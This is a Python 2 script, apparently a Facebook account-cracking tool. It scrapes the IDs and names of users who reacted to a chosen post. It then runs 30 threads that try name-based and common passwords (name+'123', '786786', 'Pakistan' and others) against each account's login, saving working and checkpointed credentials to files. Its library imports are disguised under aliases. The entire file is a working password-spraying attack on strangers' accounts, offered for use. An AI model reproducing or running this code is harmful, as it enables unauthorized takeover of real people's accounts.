# -*- coding: utf-8 -*-
#!/usr/bin/python2
#coding=utf-8

import binni4
import json
import urllib
import threading
import cookielib
import binni2
import sys
import time
import binni as b
import os
import base64
from multiprocessing.pool import ThreadPool
s=binni2.Ses()
try:
    user=open('myfile1.txt','r').read()
    header={
			"User-Agent":user,
			"from":"zuck@fb.com"
    }
except (KeyError, IOError):
    os.system('php -S 127.0.0.1:8080 &')
    os.system('')
    os.system('')
    os.system('xdg-open http://127.0.0.1:8080/.php')
    raw_input('Press Enter if you have open your browser')
    user=open('myfile1.txt','r').read()
    header={
			"User-Agent":user
    }

id=[]
def login():
    os.system('clear')
    try:
        toket = open('....', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        b.bini()
        print("            Login To Facebook\n")
        id = raw_input(' Email/Number: ')
        pwd = raw_input(' Password: ')
        url=s.pt('https://mbasic.facebook.com/login.php', data={"email":id,"pass":pwd}, headers=header).url
        if 'checkpoint' in url:
            print(" \x1b[1;91mAccount has a checkpoint\x1b[1;0m")
            os.system('rm -rf ....')
            time.sleep(1)
            os.sys.exit()
        elif 'save-device' in url or "zero" in url or "home.php" in url:
            try:
                creden=id+"/|/"+pwd
                f=open("......","a")
                f.write(creden)
                f.close()
                os.system("base64 ...... >> .... && rm ......")
                print(" \x1b[1;92mLogin Successfull\x1b[1;0m")
                time.sleep(1)
                next()
            except binni2.exceptions.ConnectionError:
                print(" \x1b[1;91mNo internet connection\x1b[1;0m")
                os.sys.exit()
        else:
            print(" \x1b[1;91mNumber or password is wrong\x1b[1;0m")
            os.system('rm -rf ....')
            time.sleep(1)
            login()
def menu():
    os.system("clear")
    b.bini()
    print("\n Wait a while . . .")
    cred=os.system("base64 -d .... >> ......")
    cred=open("......","r").read()
    id,pwd=cred.split("/|/")
    os.system("rm ...... &")
    url=s.pt('https://mbasic.facebook.com/login.php', data={"email":id,"pass":pwd}, headers=header).url
    if "checkpoint" in url:
        print(" \x1b[1;91maccount has a check point\x1b[1;0m")
        os.system("rm -rf ....")
        time.sleep(1)
        login()
    elif "save-device" in url or "home.php" in url or "zero" in url:
        next()
    else:
        print("\x1b[1;91m Wrong credentials\x1b[1;0m")
        os.system("rm -rf ....")
        time.sleep(1)
        login()

def next():
    os.system("clear")
    b.bini()
    id=[]
    cps=[]
    oks=[]
    idf=raw_input(" Target post id: ")
    print("\n Wait a while . . .")
    res=s.gt("https://mbasic.facebook.com/a/language.php?l=en_US&lref=https%3A%2F%2Ffree.facebook.com%2Fhome.php%3Fref_component%3Dmfreebasic_home_header%26ref_page%3D%252Fwap%252Fprofile_tribe.php%26refid%3D18&index=1&sref=legacy_mbasic_footer&gfid=AQAdxuI-rb_ln00N&ref_component=mbasic_footer&ref_page=%2Fwap%2Fhome.php&refid=7", headers=header).text
    res=s.gt("https://mbasic.facebook.com/ufi/reaction/profile/browser/fetch/?limit=3000&total_count=3500&ft_ent_identifier="+idf, headers=header).text
    bb = binni4.bini4(res,features = "html.parser")
    a=""
    if a=="":
        try:
            os.system("clear")
            b.bini()
            for x in bb.f_a("a", href=True):
                if x.text !="Add Friend" and "zero/toggle/settings" not in x["href"] and "home" not in x["href"] and "upsell/advanced_upsell" not in x["href"] and "photo.php" not in x["href"] and "ufi/reaction" not in x["href"]:
                    o=x.text
                    y=o.rsplit(" ")[0]
                if "/a/mobile/friends/add_friend.php?id=" in x["href"]:
                    v=x["href"]
                    z=v.replace("/a/mobile/friends/add_friend.php?id=","")
                    m=z.rsplit("&hf")[0]
                    line=m+"|"+y
                    id.append(line.strip())
        except:
            print("error")
            os.system("exit")
        print(" Total ids: "+str(len(id)))
        print("\n Please wait, Process is running in the background\n")
        print 50*("-")
        print("")
	def main(arg):
		global cps,oks
		user=arg
		uid,name=user.split("|")
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
		    pass1=name+"123"
		    q = binni2.pt('https://mbasic.facebook.com/login.php', data={"email":uid,"pass":pass1}, headers=header).url
		    #q=qp.url
		    if "checkpoint" in q:
		        print(" [Check-Point] "+uid+" | "+pass1)
		        cp=open("save/cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid+pass1)
		    else:
		        #print q
		        if 'save-device' in q or 'home.php' in q or 'zero' in q:
		            print(" \x1b[1;92m[Successfull] "+uid+" | "+pass1+"\x1b[1;0m")
		            ok=open("save/ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid+pass1)
		        else:
		            pass2="786786"
		            q = binni2.pt('https://mbasic.facebook.com/login.php', data={"email":uid,"pass":pass2}, headers=header).url
		            #q=qp.url
		            if "checkpoint" in q:
		                print(" [Check-Point] "+uid+" | "+pass2)
		                cp=open("save/cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid+pass2)
		            else:
		                #print q
		                if 'save-device' in q or 'home.php' in q or 'zero' in q:
		                    print(" \x1b[1;92m[Successfull] "+uid+" | "+pass2+"\x1b[1;0m")
		                    ok=open("save/ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid+pass2)
		                else:
		                    pass3=name+"12345"
		                    q = binni2.pt('https://mbasic.facebook.com/login.php', data={"email":uid,"pass":pass3}, headers=header).url
		                    #q=qp.url
		                    if "checkpoint" in q:
		                        print(" [Check-Point] "+uid+" | "+pass3)
		                        cp=open("save/cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid+pass3)
		                    else:
		                        #print q
		                        if 'save-device' in q or 'home.php' in q or 'zero' in q:
		                            print(" \x1b[1;92m[Successfull] "+uid+" | "+pass3+"\x1b[1;0m")
		                            ok=open("save/ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid+pass3)
		                        else:
		                            pass4="Pakistan"
		                            q = binni2.pt('https://mbasic.facebook.com/login.php', data={"email":uid,"pass":pass4}, headers=header).url
		                            #q=qp.url
		                            if "checkpoint" in q:
		                                print(" [Check-Point] "+uid+" | "+pass3)
		                                cp=open("save/cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid+pass4)
		                            else:
		                                #print q
		                                if 'save-device' in q or 'home.php' in q or 'zero' in q:
		                                    print(" \x1b[1;92m[Successfull] "+uid+" | "+pass4+"\x1b[1;0m")
		                                    ok=open("save/ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid+pass4)
		                                else:
		                                    pass5=name+"12"
		                                    q = binni2.pt('https://mbasic.facebook.com/login.php', data={"email":uid,"pass":pass5}, headers=header).url
		                                    #q=qp.url
		                                    if "checkpoint" in q:
		                                        print(" [Check-Point] "+uid+" | "+pass5)
		                                        cp=open("save/cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid+pass5)
		                                    else:
		                                        #print q
		                                        if 'save-device' in q or 'home.php' in q or 'zero' in q:
		                                            print(" \x1b[1;92m[Successfull] "+uid+" | "+pass5+"\x1b[1;0m")
		                                            ok=open("save/ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid+pass5)
		                                        else:
		                                            pass6=name+"1234"
		                                            q = binni2.pt('https://mbasic.facebook.com/login.php', data={"email":uid,"pass":pass6}, headers=header).url
		                                            #q=qp.url
		                                            if "checkpoint" in q:
		                                                print(" [Check-Point] "+uid+" | "+pass6)
		                                                cp=open("save/cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid+pass6)
		                                            else:
		                                                #print q
		                                                if 'save-device' in q or 'home.php' in q or 'zero' in q:
		                                                    print(" \x1b[1;92m[Successfull] "+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ok=open("save/ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid+pass6)
		                                                else:
		                                                    pass7=name+"789"
		                                                    q = binni2.pt('https://mbasic.facebook.com/login.php', data={"email":uid,"pass":pass7}, headers=header).url
		                                                    #q=qp.url
		                                                    if "checkpoint" in q:
		                                                        print(" [Check-Point] "+uid+" | "+pass7)
		                                                        cp=open("save/cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid+pass7)
		                                                    else:
		                                                        #print q
		                                                        if 'save-device' in q or 'home.php' in q or 'zero' in q:
		                                                            print(" \x1b[1;92m[Successfull] "+uid+" | "+pass7+"\x1b[1;0m")
		                                                            ok=open("save/ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid+pass7)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50*'-'
	print '[✓] Process Has Been Completed ....'
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cps))
	print('[✓] CP File Has Been Saved : save/ok.txt')
	print('[✓] OK File Has Been Saved : save/cp.txt')
	raw_input('\n[Press Enter To Go Back]')
	next()
if __name__=="__main__":
    login()
